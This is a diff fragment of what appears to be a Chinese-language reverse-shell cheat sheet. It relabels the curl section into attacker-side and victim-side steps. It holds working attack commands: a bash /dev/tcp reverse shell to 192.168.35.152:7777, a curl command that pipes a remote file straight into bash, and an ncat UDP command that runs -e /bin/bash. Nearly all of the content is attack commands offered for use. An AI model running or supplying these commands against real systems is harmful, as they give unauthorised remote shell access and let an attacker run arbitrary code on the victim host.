@@ -50,12 +50,16 @@ ncat --udp 192.168.35.152 7777 -e /bin/bash
 
 ## curl
 
+攻击方：
+
 ```bash
-# kali开启http服务，把bash命令写入html文件
 cat bash.html
 /bin/bash -i >& /dev/tcp/192.168.35.152/7777 0>&1
+```
 
-# centos
+被控端：
+
+```
 curl 192.168.35.152/bash.html|bash
 ```
 
